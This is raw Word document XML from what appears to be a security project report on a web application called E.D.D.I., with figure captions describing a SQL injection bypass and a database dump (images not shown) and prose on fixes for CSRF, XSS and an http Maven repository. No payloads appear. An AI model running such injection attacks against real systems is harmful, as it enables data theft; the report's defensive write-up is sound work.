        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="97"/>
      <w:r>
        <w:t xml:space="preserve">: Simple </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> error bypass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D64CFA5" w14:textId="77777777" w:rsidR="000A63AF" w:rsidRDefault="000A63AF" w:rsidP="00C172B6">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D897736" w14:textId="77777777" w:rsidR="00387971" w:rsidRDefault="000A63AF" w:rsidP="00387971">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="000A63AF">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64BD4384" wp14:editId="2D436A34">
            <wp:extent cx="5124322" cy="2307052"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>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128563" cy="2308962"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F96A1A4" w14:textId="54B7B71D" w:rsidR="000A63AF" w:rsidRPr="00C172B6" w:rsidRDefault="00387971" w:rsidP="00387971">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="98" w:name="_Ref200027797"/>
      <w:bookmarkStart w:id="99" w:name="_Ref200027793"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="98"/>
      <w:r>
        <w:t>: Users Reviews page</w:t>
      </w:r>
      <w:r w:rsidR="00CB51F8">
        <w:t xml:space="preserve">, used like a </w:t>
      </w:r>
      <w:r>
        <w:t>SQL-Oracle page</w:t>
      </w:r>
      <w:bookmarkEnd w:id="99"/>
    </w:p>
    <w:p w14:paraId="1C6335E9" w14:textId="14B0D3BD" w:rsidR="00CB51F8" w:rsidRDefault="00A92EAD" w:rsidP="00CB51F8">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="100" w:name="_vul2njr7e56l" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="100"/>
      <w:r w:rsidRPr="00A92EAD">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="12A2ED56" wp14:editId="24C894EF">
            <wp:extent cx="5351388" cy="1578923"/>
            <wp:effectExtent l="0" t="0" r="1905" b="2540"/>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354063" cy="1579712"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1231BE67" w14:textId="2F5F659B" w:rsidR="00910649" w:rsidRDefault="00CB51F8" w:rsidP="00CB51F8">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="101" w:name="_Ref200028141"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="101"/>
      <w:r>
        <w:t>: Database tables and columns dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F89440" w14:textId="77777777" w:rsidR="008121CB" w:rsidRPr="008121CB" w:rsidRDefault="008121CB" w:rsidP="008121CB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="110C9945" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="102" w:name="_Toc200039304"/>
      <w:r>
        <w:t>Security Fix</w:t>
      </w:r>
      <w:bookmarkEnd w:id="102"/>
    </w:p>
    <w:p w14:paraId="2A088E74" w14:textId="77777777" w:rsidR="008A62CD" w:rsidRPr="008A62CD" w:rsidRDefault="008A62CD" w:rsidP="008A62CD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:before="360" w:after="120"/>
        <w:contextualSpacing w:val="0"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:vanish/>
          <w:color w:val="000080"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="103" w:name="_Toc200039305"/>
      <w:bookmarkEnd w:id="103"/>
    </w:p>
    <w:p w14:paraId="2987BEC8" w14:textId="563BAFBE" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="104" w:name="_Toc200039306"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Build Misconfiguration: External Maven Dependency Repository</w:t>
      </w:r>
      <w:bookmarkEnd w:id="104"/>
    </w:p>
    <w:p w14:paraId="4E26D2A0" w14:textId="5462FF42" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The error is related to the fourth line of code, but in general to every “http” call present (</w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859217 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). It is a </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>false positive</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> because, even though the various links begin with “http,” they are </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>reinderized</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with “https” increasing security measures, preventing exposure to man-in-the-middle.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C12261" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="172B4B37" wp14:editId="72F12D3B">
            <wp:extent cx="5731200" cy="774700"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="42"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5"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="774700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7196D064" w14:textId="7A602A73" w:rsidR="00910649" w:rsidRDefault="00344C2C" w:rsidP="00317D47">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="105" w:name="_Ref199859217"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="105"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00D71B18">
        <w:t>Code Vulnerable to Build Misconfiguration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B70DF4" w14:textId="77777777" w:rsidR="00317D47" w:rsidRPr="00317D47" w:rsidRDefault="00317D47" w:rsidP="00317D47">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E387A49" w14:textId="139F02D0" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="106" w:name="_Toc200039307"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Cross-Site Request Forgery</w:t>
      </w:r>
      <w:bookmarkEnd w:id="106"/>
    </w:p>
    <w:p w14:paraId="6B755B1F" w14:textId="6D994B27" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The E.D.D.I. system now is robust against cross-site request forgery (CSRF) attacks, implementing a token-based system (</w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859394 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCFA8B2" w14:textId="52BC34DF" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">This protection involves the server generating unguessable and unique CSRF tokens upon every user interaction with a form that can modify the application </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">state </w:t>
      </w:r>
      <w:r w:rsidR="00086451">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00086451">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for example, logging in or signing up. These tokens can be accessed via the special endpoint (GET /auth/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>csrf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-token), enabling them to be generated on demand.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A360DCA" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Once created, the token is automatically inserted into HTML forms presented to the user as a hidden field (input type="hidden" name="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>csrfToken</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>" id="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>csrfToken</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"). When the form is submitted, the token is sent with the rest of the request data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7217CA5A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Before executing any operation involving a change (such as registration or login), the server verifies that the received token is valid and corresponds to the one generated earlier. This ensures that the request was initiated from the E.D.D.I. application interface and not from a malicious external website, which would not know the correct token.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05AAA35B" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>To further increase security, each token also has a limited lifetime and automatically expires after 30 minutes, thus reducing the timeframe for a possible attack. Additionally, tokens are single-use, meaning they can only be used once. They are invalidated after use to prevent an intercepted token from being reused at a later point in time (replay attack).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5035C7" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>At the architectural level, token management is addressed by a component called the '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CsrfTokenService</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">'. This service creates and validates tokens, enabling </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>centralised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and efficient management of CSRF protection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44266B0A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This mechanism protects all sensitive forms, such as login and registration forms. In general, any form submission involving changes to user data or sessions is safeguarded by this security measure.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1CF318" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="648980EC" wp14:editId="0A23C5AA">
            <wp:extent cx="3243263" cy="3864888"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2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6"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3243263" cy="3864888"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A68D59" w14:textId="32B1C018" w:rsidR="00344C2C" w:rsidRPr="005432B6" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="107" w:name="_Ref199859394"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="107"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="0036446E">
        <w:t>Login Page with Session Token generation</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F16A5B" w14:textId="77777777" w:rsidR="001237B1" w:rsidRDefault="001237B1" w:rsidP="001237B1">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="108" w:name="_Toc200039308"/>
      <w:r>
        <w:t>Cross-Site Scripting</w:t>
      </w:r>
      <w:bookmarkEnd w:id="108"/>
    </w:p>
    <w:p w14:paraId="243F0FF3" w14:textId="16D6BAD5" w:rsidR="001A7890" w:rsidRPr="001A7890" w:rsidRDefault="001A7890" w:rsidP="001A7890">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">To fix the XSS vulnerability in the ReviewResource.java file </w:t>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200044561 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> for both submitting and retrieving reviews, proper protection was achieved by adding a layer</w:t>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200044578 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="003C1260">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BAB64DC" w14:textId="3D081F52" w:rsidR="001A7890" w:rsidRPr="001A7890" w:rsidRDefault="001A7890" w:rsidP="001A7890">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Firstly, user data was sanitised. In essence, whenever a user submits data such as their name, email address or review text, it is 'sanitised' via the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>escapeHtml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> method. This prevents the storage of data containing potentially malicious HTML or JavaScript code, ensuring it cannot be executed in the viewer's browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098A7584" w14:textId="530C6B78" w:rsidR="001A7890" w:rsidRPr="001A7890" w:rsidRDefault="001A7890" w:rsidP="001A7890">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This is followed by careful configuration of HTTP headers in server replies. Specifically, the response content type is explicitly specified as text/plain for POST requests and application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> for GET requests, to prevent the browser from misinterpreting the received information. Additionally, the X-Content-Type-Options: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>nosniff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> header is used to prevent the browser from 'guessing' the content type, which could cause unexpected or malicious behaviour.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C89DF21" w14:textId="715EB380" w:rsidR="001237B1" w:rsidRPr="001A7890" w:rsidRDefault="001A7890" w:rsidP="001237B1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A7890">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Another layer of security is the Content Security Policy (CSP), which is configured very strictly. This policy blocks scripts altogether and restricts connections and styling to local resources only. Even if some malicious content evaded the initial checks, the browser would still not allow it to run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FB6BA7" w14:textId="77777777" w:rsidR="009E1274" w:rsidRDefault="001237B1" w:rsidP="009E1274">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F16273">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46581BD2" wp14:editId="3D30101F">
            <wp:extent cx="5733415" cy="1322070"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>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3415" cy="1322070"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
